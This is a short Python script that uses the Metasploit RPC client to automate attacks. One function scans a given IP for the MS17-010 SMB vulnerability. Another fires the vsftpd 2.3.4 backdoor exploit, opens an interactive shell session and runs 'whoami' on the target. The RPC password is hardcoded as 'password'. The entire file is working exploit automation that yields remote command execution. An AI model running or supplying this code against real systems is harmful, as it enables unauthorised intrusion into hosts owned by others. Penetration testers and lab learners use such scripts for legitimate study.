from metasploit.msfrpc import MsfRpcClient
from metasploit.msfconsole import MsfRpcConsole
import os

global vuln_list
vuln_list = list()
global console_status
console_status = False


msfrpc_pass = 'password'
client = MsfRpcClient(msfrpc_pass)

def read_console(console_data):
    global console_status
    console_status = console_data['busy']
    print(console_status)

    if '[+]' in console_data['data']:
        # sigdata = console_data['data'].rstrip().split('\n')
        print(console_data['data'].rstrip().split('\n'))

    # for ip in sigdata:
    #     vuln_list.append(ip)
    print(console_data['data'])

console = MsfRpcConsole(client, cb=read_console)

def scan_smb_ms17_010(ip_addr):
    console.execute('use auxiliary/scanner/smb/smb_ms17_010')
    console.execute('set RHOSTS ' + ip_addr)
    console.execute('run')



def scan_vsftpd_234_backdoor(ip_addr):
    exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')

    exploit['RHOST'] = ip_addr
    exploit['RPORT'] = "21"

    exploit.execute(payload="cmd/unix/interact")

    print("Sessions avaiables : ")
    for s in client.sessions.list.keys():
        print(s)

    shell = client.sessions.session(list(client.sessions.list.keys())[0])

    shell.write('whoami\n')

    print(shell.read())

    # shell.stop()

    os.system("py3clean .")

